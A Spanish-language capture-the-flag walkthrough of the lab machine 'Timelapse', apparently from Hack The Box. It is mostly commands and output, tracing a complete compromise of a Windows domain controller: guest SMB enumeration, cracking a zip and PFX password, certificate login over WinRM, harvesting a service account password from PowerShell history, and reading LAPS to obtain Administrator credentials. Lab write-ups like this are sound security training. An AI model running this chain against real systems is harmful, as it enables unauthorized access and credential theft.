>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.227.113
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 11:15 EST
Nmap scan report for 10.129.227.113
Host is up (0.058s latency).
Not shown: 65519 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-01-16 00:15:32Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.88 seconds
```

>Enumeramos con netexec datos del DC:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ nxc smb 10.129.227.113                                
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ echo "10.129.227.113 timelapse.htb DC01 dc01.timelapse.htb" >> /etc/hosts
```

>Enumeramos shares por SMB empleando Guest Login:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ nxc smb 10.129.227.113 -u 'guest' -p '' --shares
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest: 
SMB         10.129.227.113  445    DC01             [*] Enumerated shares
SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.227.113  445    DC01             Shares          READ            
SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
```

>Nos conectamos a la share **Shares** y obtenemos un archivo **zip** y unos programas que suscitan que se emplea **LAPS** en el servidor:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ smbclient -U "guest" '\\10.129.227.113\Shares'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> cd dev
smb: \dev\> get winrm_backup.zip
getting file \dev\winrm_backup.zip of size 2611 as winrm_backup.zip (10.9 KiloBytes/sec) (average 10.9 KiloBytes/sec)
smb: \dev\> ls ..\helpdesk\
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
```

>Crackeamos la contraseña del zip ya que es **Password Protected**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ zip2john winrm_backup.zip > ziphash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ john -w=/usr/share/wordlists/rockyou.txt ziphash             
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-01-15 11:23) 3.333g/s 11578Kp/s 11578Kc/s 11578KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

>Crackeamos ahora la **passphrase** del **pfx** que acabamos de obtener de dentro del zip:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ pfx2john legacyy_dev_auth.pfx > pfxhash

┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ john -w=/usr/share/wordlists/rockyou.txt pfxhash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:01:20 DONE (2026-01-15 11:26) 0.01242g/s 40159p/s 40159c/s 40159C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

>Vamos a sacar del PFX un **certificate.pem** y un **priv-key.pem** para poder iniciar sesión por **WinRM over SSL** que está abierto en la máquina víctima (Puerto 5896 TCP):

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem                                         
Enter Import Password:
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
Enter Import Password:
```

>Entramos por WinRM usando los certificados y claves y usando SSL:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ evil-winrm -i 10.129.227.113 -S -c certificate.pem -k priv-key.pem
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

>Si ejecutamos el siguiente comando que abre todos los **historiales de PowerShell** de los usuarios del sistema, podremos ver las credenciales de un usuario: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`

```powershell
*Evil-WinRM* PS C:\> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

>Entramos por **WinRM** con el usuario nuevo y vemos que pertenece a un grupo llamado **LAPS_Readers** por lo que quizas podemos leer las contraseñas **LAPS** del servidor:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ evil-winrm -i 10.129.227.113 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

>Creamos credencial de nuestro usuario:

```powershell
$password = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential('timelapse\svc_deploy',$password)
```

>Importamos el módulo Get-LAPSPasswords.ps1 y leemos las contraseñas LAPS disponibles: https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/refs/heads/master/Get-LAPSPasswords.ps1

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ipmo .\Get-LAPSPasswords.ps1
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSPasswords -DomainController 10.129.227.113 -Credential $Credential | Format-Table -AutoSize

Hostname           Stored Readable Password                 Expiration
--------           ------ -------- --------                 ----------
dc01.timelapse.htb 1      1        pyGeX$C}Qr632u/n#Ub2V47P 1/20/2026 4:14:15 PM
dc01.timelapse.htb 1      1        pyGeX$C}Qr632u/n#Ub2V47P 1/20/2026 4:14:15 PM
                   0      0                                 NA
dc01.timelapse.htb 1      1        pyGeX$C}Qr632u/n#Ub2V47P 1/20/2026 4:14:15 PM
                   0      0                                 NA
                   0      0                                 NA
dc01.timelapse.htb 1      1        pyGeX$C}Qr632u/n#Ub2V47P 1/20/2026 4:14:15 PM
                   0      0                                 NA
                   0      0                                 NA
                   0      0                                 NA
```

>Ahora comprobamos que las credenciales son válidas para el **Administrator** del **DC** ya que LAPS randomiza las credenciales de los Administradores locales para evitar ataques como el Pass-The-Hash y ya habríamos comprometido la máquina al ganar acceso por WinRM como el usuario Administrador:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ nxc smb 10.129.227.113 -u 'Administrator' -p 'pyGeX$C}Qr632u/n#Ub2V47P'
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\Administrator:pyGeX$C}Qr632u/n#Ub2V47P (Pwn3d!)
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/timelapse]
└─$ evil-winrm -i 10.129.227.113 -u 'Administrator' -p 'pyGeX$C}Qr632u/n#Ub2V47P' -S
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
